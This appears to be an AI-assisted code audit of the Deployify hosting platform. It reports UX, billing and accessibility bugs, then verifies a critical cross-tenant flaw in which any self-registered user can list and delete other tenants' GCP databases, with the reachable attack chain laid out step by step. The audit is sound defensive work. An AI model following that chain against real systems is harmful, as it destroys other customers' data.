CSRF — enumerated all 84 route handlers under src/app/api/**. Zero use Origin, Referer, Sec-Fetch-Site, or a CSRF token. I checked for GET-with-side-effects and found only the two OAuth handlers (intended), storage metrics, and /api/cron/optimize. I deliberately did not report plain cross-site CSRF, since SameSite=Lax does block it; the finding is scoped to the same-site sibling-subdomain vector that the tenant proxy creates, which Lax does not cover.

Ruled out after investigation: src/app/edge-debug/actions.ts runs user code through node `vm` (not a real sandbox) but is gated by `NODE_ENV !== 'development' && !== 'test' && !process.env.SIMULATION_ALLOWED`, and `SIMULATION_ALLOWED` appears nowhere outside the test file and is absent from env.example — so it is not reachable in production. The `analyticsApiKey` interpolated into the injected script tag at proxy route lines 154/185 is never written by any code path, so it is not an attribute-injection vector.

Not covered: I did not audit the ~92 lib modules or the billing webhook signature verification (other dimensions), did not review src/middleware/rbac.ts's role matrix in depth beyond confirming it is provenance-agnostic, and did not exercise anything at runtime — every finding is from static reading, with the two URL-parsing and Headers-iteration claims verified by running Node locally.

findings.title: Redeploy and Cancel always show a green success toast, even when the API rejects the request with a 403/400
findings.failure_scenario: A Free-plan customer at their 20-deployment monthly cap opens /dashboard/<id> and clicks "Redeploy". /api/projects/[id]/deploy returns 403 with `{error: "Usage limit exceeded: deployments. Please upgrade your plan."}`. redeployProject sees `!response.ok`, skips fetchDeployments, logs nothing user-visible, and resolves. handleRedeploy then fires `toast.success('Deployment triggered')`. The user sees a green success toast, no new row appears in the deployment list, and they have no way to learn they hit a quota. Identical for a `viewer`-role teammate (403) and for a repo that fails pre-flight validation (400 with a specific `validation.error`). handleCancel has the same shape: it reports "Deployment cancelled" while the build keeps running and keeps burning billable build minutes.
findings.impact: The two most-used buttons on the project page lie about success. Users retry, escalate to support, or silently lose deployments. The upgrade prompt — the one message that would convert a capped Free user to Pro — is generated by the server and discarded by the client, so quota exhaustion reads as a broken product rather than a paywall.
findings.checked_mitigations: Grepped the whole file for `res.ok`/`response.ok` in the redeploy path (only 1 `.ok` in src/app/dashboard/[id]/page.tsx, at line 121 in confirmRollback — which does handle errors correctly, proving the pattern is known here). Read src/store/project-slice.ts:220-252 in full: no toast, no error state, no return value; the ProjectSlice interface at lines 58-59 types both as `Promise<void>` so the caller cannot check. Confirmed no global fetch interceptor or error boundary exists (no wrapper around fetch anywhere in src/store).

findings.title: Dashboard silently renders the first-run "Welcome to Deployify" onboarding screen whenever /api/projects fails
findings.failure_scenario: A customer with 20 live projects leaves a dashboard tab open past JWT expiry, or Firestore has a blip. On focus/team-switch the effect refires; /api/projects returns 401 or 500. `response.json()` succeeds (both are JSON), `data.projects` is undefined, `setProjects([])` runs, `loading` flips false, and the page renders `<OnboardingGuide />`: "Welcome to Deployify — Connect GitHub / Import Project". The fleet-health header at line 127 is also gated on `projects.length > 0` so it vanishes too. The user's honest read is that their entire account was wiped. Same outcome on a 500 that returns an HTML error page: `.json()` throws, the catch only console.errors, `projects` stays `[]`, onboarding renders.
findings.impact: The single worst error state a hosting platform can show a paying customer: total data loss, presented calmly as a welcome screen, with no error text and no retry control. There is no path back other than a manual reload, and a user who believes their projects are gone opens a P1 ticket or churns.
findings.checked_mitigations: Grepped dashboard/page.tsx for `.ok`, `status ===`, and any error state — there is exactly one `.ok` reference in the file and none in fetchProjects; there is no `error` useState and no error branch in the render tree (lines 258-322 render only loading / OnboardingGuide / no-search-results / grid). Checked src/proxy.ts:176 — API paths get `NextResponse.json({ error: 'Unauthorized' }, { status: 401 })`, not a redirect, so an expired session reaches this code path as a parsable 401. Confirmed src/components/EmptyState.tsx has no error variant. Note the billing store (src/store/billing-slice.ts:64-69) does handle 401 and !ok correctly, so the codebase knows the pattern — the dashboard just omits it.

findings.title: currentProject is never cleared, so a failed project fetch renders the previous project's settings under the new project's URL and wires Save/Delete to the wrong project id
findings.failure_scenario: A user is on /dashboard/A/settings, then navigates to /dashboard/B/settings. `/api/projects/B` returns 500 (or 403 after a role change, or times out). `projectResponse.ok` is false, so `currentProject` stays as project A; `isLoadingProject` flips false; the `!project` "Project Not Found" branch at line 105 is skipped because `project` is truthy. The page renders A's framework, build command, install command, root/output directory, webhook URL and toggles under B's URL. The user edits the build command believing they are editing B and clicks Save — `saveProjectSettings(project.id)` PATCHes /api/projects/A, silently overwriting project A's real build configuration, and toasts "Settings saved". Same class of bug on the project detail page (src/app/dashboard/[id]/page.tsx), where Redeploy/Rollback are bound to `project.id`.
findings.impact: Silent cross-project configuration overwrite with a success toast. The user has no signal that the page is showing a different project than the URL, and the damage lands on a project they were not even looking at — the hardest kind of corruption to diagnose after the fact.
findings.checked_mitigations: Grepped for any reset: `rg 'currentProject: null|setCurrentProject|clearProject'` returns only the declaration/definition at src/store/project-slice.ts:43,111,147 — no caller. Checked the settings page's guard at src/app/dashboard/[id]/settings/page.tsx:105 (`if (!project)`) — it only fires when currentProject is null, i.e. on the very first load, never on a subsequent navigation. Checked that params.id is not compared against project.id anywhere in the page render. Confirmed the deployments/stats sub-fetches at lines 189-199 are correctly guarded on `.ok`, which shows the author guarded the inner responses but not the outer one.

findings.title: The Enterprise plan's "Contact Sales" button opens a live ₹15,000 Razorpay charge, and paying customers have no way to downgrade or cancel
findings.failure_scenario: (a) A prospect on the Team plan clicks the Enterprise card's "Contact Sales" button expecting a lead form. `onUpgrade('enterprise')` fires, /api/billing/checkout mints a real Razorpay order for 1,500,000 paise, and a ₹15,000 payment sheet opens over the page. (b) A Team-plan customer who wants to downgrade to Pro sees a button labelled "Upgrade to Pro" — clicking it charges ₹1,500 for a lower tier with no proration notice and no confirmation. (c) A Pro customer who wants to cancel finds the Free card's button permanently `disabled` (`plan.id === 'free' && !isCurrent`), no "Cancel subscription" control anywhere on the page, and no API route that would serve one.
findings.impact: An unintended ₹15,000 charge from a button whose label promises a conversation, and a recurring paid subscription with no self-serve exit. Beyond the immediate chargebacks and support load, a paid subscription with no in-product cancellation is a consumer-protection exposure in most of the markets this INR-priced product targets.
findings.checked_mitigations: Read the full checkout route: the only tier rejection is `if (tier.id === 'free')` at line 57 — nothing special-cases enterprise, and the MOCK_DB branch at line 45 returns a mock order for it too. Grepped src/app/api/billing/** for 'cancel', 'downgrade', 'subscription' — no such route. Grepped src/components/billing/** and src/app/billing/page.tsx for any 'Cancel'/'Downgrade' control — none. Confirmed ComparePlansTable (src/app/billing/page.tsx:334) is display-only. Confirmed handleUpgrade has no `isEnterprise` branch.

findings.title: After a successful payment the billing page never refetches, so the customer's plan badge and quota gauges keep showing the tier they just paid to leave
findings.failure_scenario: A Free-plan user clicks "Upgrade to Pro", completes the ₹1,500 Razorpay payment, and /api/billing/verify returns 200. They see "Payment Successful & Verified! Upgrading your plan...". Then: the "Current Plan" badge still reads FREE, the Pro card still says "Upgrade to Pro" (and is still clickable — a second ₹1,500 charge is one click away), the Free card is still ring-highlighted as current, and the usage gauges still show 20 deployments / 100 build minutes / 5 GB. router.refresh() re-renders the RSC tree, but no server component supplies any of this — the zustand store is untouched. Nothing changes until the user does a full page reload.
findings.impact: The moment immediately after taking a customer's money is the moment the product looks most broken. The user reasonably concludes the payment did not apply; the still-enabled "Upgrade to Pro" button invites a duplicate charge, and the alternative is a refund request. Also silently applies to the invoice table, which stays empty right after the purchase.
findings.checked_mitigations: Read src/store/billing-slice.ts end to end (87 lines): `usageData` is written only in `fetchBillingData`; there is no subscription, poll, or webhook-driven update. Confirmed the page is a client component with no server-rendered billing data and no billing layout.tsx that could supply any (`ls src/app/billing/` shows only page.tsx). Confirmed the `useEffect` dep is the zustand action, which is referentially stable across renders. findings.title: "Purge All Orphans" irreversibly deletes GCP databases chosen by a substring heuristic, behind a native confirm() that never names them, from a button styled identically to "Clear"
findings.failure_scenario: A customer runs infra discovery against their own GCP project, which also hosts a long-lived Cloud SQL instance they named `acme-pr-analytics` (or any name containing `-pr-` or `-branch-`). It does not match any active Deployify branch pattern, so discovery flags it `isOrphaned`. The header shows "3 ORPHANED" and offers a 20px-tall ghost button reading "Purge All Orphans" immediately to the left of an identically sized, identically styled "Clear" button that merely hides the list. One misclick, one native browser confirm that says only "PURGE ALL 3 orphaned resources" without naming a single one, and the loop issues DELETE for each — permanently destroying a production Postgres instance the user never registered with Deployify.
findings.impact: The most destructive action in the product has the weakest confirmation in the product. Deleting a *project* gets a styled modal; permanently destroying N of the customer's real cloud databases — including ones Deployify does not own and only guessed at by filename — gets a browser alert that lists nothing and a button that looks like "Clear". The blast radius is the customer's entire GCP project and the loss is unrecoverable.
findings.checked_mitigations: Verified no stronger gate exists: grepped the repo for `confirmInput`, `=== project.name`, `type the name`, `to confirm` — zero hits, so there is no type-to-confirm anywhere. Confirmed the confirm() string is the only interstitial (no ConfirmationModal is used on this path, even though the same file uses ConfirmationModal 17 times). Confirmed the dialog does not enumerate the resources and the per-resource loop has no per-item confirmation. Read src/lib/gcp/discovery.ts:85-105 to confirm the heuristic scans the whole GCP project's Cloud SQL list, not a Deployify-owned subset.

findings.title: The entire product renders at 8px, including every page's <h1>, and status text uses colors at ~1.9:1 contrast
findings.evidence:
Every page heading is 8px on mobile, 10px on desktop — src/app/dashboard/page.tsx:202-204:

{activeTeam ? `${activeTeam.name} Projects` : 'Personal Projects'}

That exact class string appears 50 times across src (`rg -n 'className="text-\[8px\] md:text-\[10px\] font-bold' src --glob '*.tsx' | wc -l` → 50), including "Welcome to Deployify" (src/components/OnboardingGuide.tsx:56), "Billing & Usage" (src/app/billing/page.tsx:238), and "Project Settings" (src/app/dashboard/[id]/settings/page.tsx:147). Body copy is the same size: `rg -o 'text-\[8px\]' src --glob '*.tsx' | wc -l` → 1209 occurrences across 79 files; `text-[10px]` → 331. Nothing rescales them: src/app/globals.css defines no `html`/`:root` font-size and no zoom/transform — html/body carry only `max-width: 100vw; overflow-x: hidden` (globals.css:115-119) and background/color/font-family (121-127). Tailwind arbitrary values are literal CSS, and there is no tailwind.config.* in the repo. Status values are additionally rendered in colors that fail WCAG AA against the light theme's white background — src/app/dashboard/page.tsx:158-165: Slow {infraHealth.summary.degradedConnectors} with src/app/globals.css:5 `--background: #ffffff` and :31 `--warning: #eab308` (contrast 1.92:1) and :29 `--success: #22c55e` (2.04:1) — both far below the 4.5:1 AA threshold.
findings.failure_scenario: A customer opens /dashboard at 100% browser zoom on a 1440p display. The page title, the project names, the deployment status badges, the commit messages, the build/install command labels on the settings page, the pricing-card features, and the invoice table headers all render at 8 CSS pixels in bold uppercase with widened letter-spacing — roughly half the size of the browser's own UI chrome and below what most adults can read without leaning in. On the fleet-health card the count of degraded connectors is 8px #eab308 on #ffffff at 1.92:1, which is effectively invisible; a customer with three slow database connectors cannot see the number that tells them so.
findings.impact: This is the first impression of every screen and it makes the product feel broken rather than dense. Practically, it blocks the WCAG 1.4.3 contrast criterion outright on the status system, so any enterprise or public-sector buyer running an accessibility review fails the product at the front door; and the 8px body copy pushes every user to permanent browser zoom, at which the fixed max-w-7xl layouts and 8px-tuned paddings were never tested.
findings.checked_mitigations: Checked for a global rescale that would make these sizes relative: grepped src/app/globals.css for `font-size`, `zoom`, `transform: scale`, `html {`, `:root` — the only font-size rules are 0.875rem/0.75rem on unrelated scoped selectors (lines 167, 235, 259, 374), never on html or body. Confirmed no tailwind.config.* exists (`ls tailwind.config*` → no matches), so no theme override reinterprets arbitrary values; globals.css:1 is `@import "tailwindcss"` (v4), where `text-[8px]` compiles to `font-size: 8px` literally. Computed both contrast ratios from the actual hex values in :root rather than estimating. Note the most recent commit is titled "refactor: final UI scale down", so this is the intended shipped state, not a work in progress.

findings.title: Account/project deletion has no type-to-confirm, and no modal in the app has dialog semantics, a focus trap, or an Escape handler
findings.evidence:
The single shared modal used for every destructive confirmation is a plain div — no role, no aria-modal, no aria-labelledby, no Escape listener, no focus management, and no backdrop-click handler (src/components/ui/confirmation-modal.tsx:39-46):
  if (!isOpen) return null;

  return (
    <Portal>
      <div className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 backdrop-blur-sm p-4 animate-fade-in">
        <div className="bg-[var(--card)] border border-[var(--border)] w-full max-w-md rounded-xl shadow-2xl flex flex-col overflow-hidden animate-fade-in">

`rg 'role="dialog"|aria-modal|useFocusTrap|focus-trap' src --glob '*.tsx'` returns zero matches repo-wide, across 20+ ConfirmationModal call sites (17 in StorageSection.tsx alone, plus EnvVariablesSection, CronsSection, DomainsSection, IaCExportModal, OptimizationModal, and both settings pages). src/components/ui/portal.tsx has no key handling either.

And the highest-stakes confirmation in the product is a single click with no typed confirmation — src/app/dashboard/settings/page.tsx:291-299:
                <ConfirmationModal
                    isOpen={confirmDeleteAccount}
                    onClose={() => setConfirmDeleteAccount(false)}
                    onConfirm={handleDeleteAccount}
                    title="Delete Account"
                    description="Are you sure you want to delete your account? All your projects, deployments, and data will be permanently removed. This action cannot be undone."
                    confirmText="Delete Account"
                    variant="destructive"
                />

Same for Delete Project (src/app/dashboard/[id]/settings/page.tsx:434-447). `rg 'confirmInput|=== project.name|type the name|to confirm' src --glob '*.tsx'` → zero matches: there is no type-to-confirm pattern anywhere in the codebase.
findings.failure_scenario: (a) A user opens the account Danger Zone, clicks "Delete Account", and the modal's "Delete Account" button lands under the cursor two clicks after the trigger with no typed confirmation — a double-click or a mis-aimed second click permanently destroys every project, deployment and env var on the account. (b) A keyboard user opens the same modal: focus stays on the now-hidden trigger button behind the overlay, Tab walks through the entire page underneath before ever reaching Cancel/Confirm, Escape does nothing (only src/components/CommandPalette.tsx and GlobalShortcuts.tsx bind Escape — the modal does not), and clicking the backdrop does nothing either, so there is no way to dismiss the dialog except finding and activating Cancel. (c) A screen-reader user gets no announcement that a dialog opened at all, since the container is an unlabelled div.
findings.impact: The delete-account and delete-project flows sit one stray click from irreversible loss with less friction than every peer platform, which all require typing the resource name. Separately, the total absence of dialog semantics means keyboard and assistive-technology users cannot reliably operate — or escape — any of the 20+ modals, including the ones that drop databases and restore backups over live data; that is a WCAG 2.1 keyboard/no-keyboard-trap and name-role-value failure across the product's entire confirmation layer.
findings.checked_mitigations: Grepped repo-wide for the mitigations before reporting: `role="dialog"`, `aria-modal`, `useFocusTrap`, `focus-trap` → 0 hits; `'Escape'|"Escape"` → 6 hits, none in confirmation-modal.tsx or portal.tsx (they are in CommandPalette, GlobalShortcuts, query-editor, LandingPage, and the dashboard search input). Confirmed no headless-UI/Radix Dialog dependency is used for these (the modal is hand-rolled over src/components/ui/portal.tsx, which only does createPortal). Confirmed no type-to-confirm helper exists under src/components/ui/. Verified the ConfirmationModal props interface (lines 8-22) has no field that would enable a typed confirmation, so no call site can opt in.

result.reasoning:
I read the route end-to-end and hunted specifically for a missed guard; there is none at any layer.

VERIFIED, LINE BY LINE:
1. src/app/api/gcp/discover/route.ts DELETE (lines 64-140): the ONLY authorization is getSession() (66), checkProjectAccess(session.user.id, projectId) (83), and the owner/admin gate (88). `resourceId` is read at line 73 and reaches deleteInstance/deleteDatabase at 98/102/105 with zero validation. 2. No wrapper exists. The route exports GET/DELETE bare — `grep "export const"` on the file returns nothing (no route segment config), and there is no withAuth/withRbac/requireRole anywhere under src/app/api/gcp/.
3. src/middleware/rbac.ts:8-34 — checkProjectAccess resolves ONLY the caller's own projectId. For a project with no teamId it returns role 'owner' whenever project.userId === userId. It never inspects storageConfigs, so it cannot constrain resourceId.
4. src/proxy.ts (the Next.js 16 middleware replacement) — confirmed the finder's read: security headers, per-IP rate limiting (100/min for non-strict /api routes), and subdomain rewrite. Its only session check covers /dashboard and /new, and even that is bypassed under NODE_ENV=development or MOCK_DB. No authorization for /api/gcp/*.

All three sinks accept a bare attacker-supplied name with no ownership check: src/lib/gcp/cloudsql.ts:841-861 (deleteInstance), src/lib/gcp/memorystore.ts:87-110, src/lib/gcp/firestore-admin.ts:80-102. Each resolves `projectId || config.gcp.projectId || process.env.GCP_PROJECT_ID`. The MOCK_DB short-circuit is dev-only, as the finder said.
6. Shared-tenancy premise confirmed. src/lib/config.ts:29-35 defines gcp.projectId as a single env var. src/lib/gcp/auth.ts:16-52 (getGcpAccessToken) uses the metadata-server default SA or ADC — one platform-wide credential, with no per-tenant GCP credential path in the codebase. src/app/api/projects/[id]/storage/route.ts:112 sets resourceName = name.toLowerCase().replace(/\s+/g,'-') and calls createCloudSqlInstance(resourceName, type, region, opts) with no GCP-project argument, so instance names are the raw user-typed connector name in one flat namespace (two tenants naming a DB "prod-db" would literally collide).
7. Enumeration leg confirmed: src/lib/gcp/discovery.ts:85, 116, 150 list projects/${targetProjectId}/instances|databases with no tenant filter, returning every instance in the shared project. GET's gate is even weaker than DELETE's (only excludes 'viewer', line 30).
8. No compensating test and no ownership helper: grep for verifyResourceOwnership|assertOwnership|validateResource|belongsToProject|ownedBy across src/ returns zero hits; no test file references gcp/discover or discoverResources.
9. The sibling-route comparison is real and damning: src/app/api/projects/[id]/storage/[storageId]/clone/route.ts:35-47 re-checks checkProjectAccess on the second resource under a comment reading "Security: Verify access to target project ... (BOLA fix)". The pattern is known to this codebase and omitted here.
10. Attacker precondition chain is open, not theoretical: src/app/api/auth/callback/route.ts:51 upserts any GitHub OAuth user with no allowlist or org restriction, and src/app/api/projects/route.ts:60-84 lets any session create a project with no teamId, making the creator 'owner' — so the line-88 role gate passes trivially.

I could not construct any reading under which this is safe. Severity stands at critical: unauthenticated-to-authenticated is one OAuth click, the impact is unrecoverable destruction of another tenant's production database, and it is a single unauthenticated-shaped HTTP DELETE after a GET that hands the attacker the target list.
result.correction: The claim is correct as written; two refinements make it slightly worse rather than weaker. (a) The blast radius is not confined to the single shared config.gcp.projectId: `gcpProjectId` is itself an attacker-controlled query parameter (route.ts:76) forwarded verbatim into deleteInstance/deleteDatabase, so the attacker can target ANY GCP project reachable by the platform service account (src/lib/gcp/auth.ts uses the metadata-server default SA / ADC), not just the default one. (b) The GET half is an independent cross-tenant information-disclosure bug with an even weaker gate — it only rejects role 'viewer' (route.ts:30), where DELETE at least requires owner/admin — and it leaks every Cloud SQL, Memorystore and Firestore resource name, region, state, databaseVersion and connectionName in the shared project. Correct fix mirrors the existing BOLA fix in src/app/api/projects/[id]/storage/[storageId]/clone/route.ts:35-47: resolve resourceId against access.project.storageConfigs (matching the provisioned resourceName/metadata) before deleting, reject any caller-supplied gcpProjectId that is not the project's own bound GCP project, and filter discovery results to resources belonging to the requesting Deployify project.

The claim is accurate as written; my verification strengthens rather than weakens it. Precise restatement:

REACHABLE CHAIN (every step verified in source, no implausible precondition, attacker starts with zero privilege):
1. Open self-registration. /Users/asangborkar/Documents/Plexaverse/deployify/src/app/api/auth/callback/route.ts calls `upsertUser(...)` on any successful GitHub OAuth with no allowlist, org check, or email-domain gate. Any GitHub account becomes a Deployify user.
2. Free `owner` role. POST /Users/asangborkar/Documents/Plexaverse/deployify/src/app/api/projects/route.ts requires only `repoFullName` for a repo the caller can read (their own); `teamId` is optional and webhook creation failure is explicitly tolerated. With `teamId` omitted the row is `{userId: attacker, teamId: null}`, and /Users/asangborkar/Documents/Plexaverse/deployify/src/middleware/rbac.ts:23-26 returns `{allowed: true, role: 'owner'}` for personal ownership. The owner/admin gate at discover/route.ts:88 is therefore self-granted.
3. Cross-tenant read. GET /api/gcp/discover?projectId=<own> passes `targetGcpProjectId = undefined`, so /Users/asangborkar/Documents/Plexaverse/deployify/src/lib/gcp/discovery.ts:23 falls back to `config.gcp.projectId` and lists `sqladmin .../projects/{shared}/instances` (line 81), `redis .../locations/-/instances` (line 111) and `firestore .../databases` (line 150) with no label, prefix, or ownership filter. 4. Cross-tenant destroy. DELETE with an arbitrary `resourceId` reaches cloudsql.ts:846-852 / memorystore / firestore-admin directly. `resourceId` is never matched against `access.project.storageConfigs` — I re-grepped the file and confirmed `storageConfigs` never appears in it.

SHARED-NAMESPACE PREMISE CONFIRMED: `Project` in /Users/asangborkar/Documents/Plexaverse/deployify/src/types/index.ts:114-160 has no per-tenant GCP project field, and `createInstance` (/Users/asangborkar/Documents/Plexaverse/deployify/src/lib/gcp/cloudsql.ts:36) hardcodes `config.gcp.projectId`. FOUR AGGRAVATING FACTS THE FINDER DID NOT NOTE:

Multi-tenancy with open enrollment is real: /Users/asangborkar/Documents/Plexaverse/deployify/src/app/api/auth/callback/route.ts calls `upsertUser` for any GitHub account with no allowlist, org gate, or email-domain check, and createProject (src/lib/db.ts:978) is unrestricted. result.correction:
The finding is correct as written; two refinements to scope and impact.

Scope: what leaks is resource *metadata*, not credentials or data — instance name, region, state, databaseVersion and connectionName (project:region:instance) for Cloud SQL, plus Memorystore instance ids/sizes and Firestore database ids. connectionName is not a secret by itself, so this is a tenant-isolation break and reconnaissance primitive rather than direct data access. The `gcpProjectId` override widens the target only to GCP projects the platform service account already has read IAM on (in practice the platform project plus any customer cross-project connector project), not to arbitrary projects.

Impact amplifier the finder missed, in the same file: the DELETE handler (src/app/api/gcp/discover/route.ts:64-108) is unfiltered in exactly the same way. resourceId comes straight from the query string, the only authorization is owner/admin on the caller's *own* project (line 88), and it flows to deleteInstance(resourceId, gcpProjectId || undefined) → src/lib/gcp/cloudsql.ts:846, which resolves to the same shared config.gcp.projectId. So the GET is the enumeration step for a cross-tenant *destruction* primitive: a user who signs up, creates one throwaway project, calls GET to list every tenant's databases, then calls DELETE with another tenant's instance name, destroys that tenant's database. Treated together, the discover route is critical; the GET disclosure alone is high.

Fix should be a server-side ownership filter (e.g. require a GCP label such as deployify-project=<projectId> applied at provisioning and filter discovery results on it, and validate on DELETE that the named resource is recorded in the caller's project storageConfigs), plus rejecting or allowlisting the caller-supplied gcpProjectId against the project's stored providerProjectId.
